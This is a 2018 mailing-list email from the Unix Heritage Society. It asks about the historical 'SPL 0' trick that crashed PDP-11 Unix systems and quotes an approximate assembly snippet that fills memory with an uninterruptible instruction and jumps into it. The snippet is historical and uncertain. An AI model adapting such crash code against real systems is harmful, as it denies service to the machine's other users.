@@ -1,0 +1,34 @@
+From: dave@horsfall.org (Dave Horsfall)
+Date: Mon, 9 Apr 2018 16:18:28 +1000 (EST)
+Subject: [TUHS] That "SPL 0" instruction...
+Message-ID: <alpine.BSF.2.21.1804091611540.767@aneurin.horsfall.org>
+
+A nerdy group on an Aussie list are discussing old Unix cracks, and the 
+infamous "SPL 0" brick-that-box came up.  I first saw it in ";login:" (I 
+think), and, err, tried it (as did others)...
+
+Can anyone reproduce the code?  It went something like:
+
+     > [ SPL 0 ]
+     >
+     > I only did that once (and you should've heard what he said to me)...
+     > I'm still trying to find the source for it (it was published in a
+     > ";login:" journal) to see if SIMH is vulnerable.
+
+     The concept was simple enough - fill your entire memory space with an uninterruptible instruction.  It would have gone something like:
+
+     opc = 000230			; 000230 is the opcode for SPL 0
+
+ 	    sys	brk, -1		; or whatever value got you all 64k of address space
+ 	    mov	#place, sp
+ 	    jmp	place
+
+     . = opc - 2			; the -2 is to allow for the PC increment on an instruction fetch, which I believe happens before any execution
+     place:
+ 	    jsr	pc, -(pc)
+
+Ring any bells, anyone?
+
+-- 
+Dave Horsfall DTM (VK2KFU)  "Those who don't understand security will suffer."
+
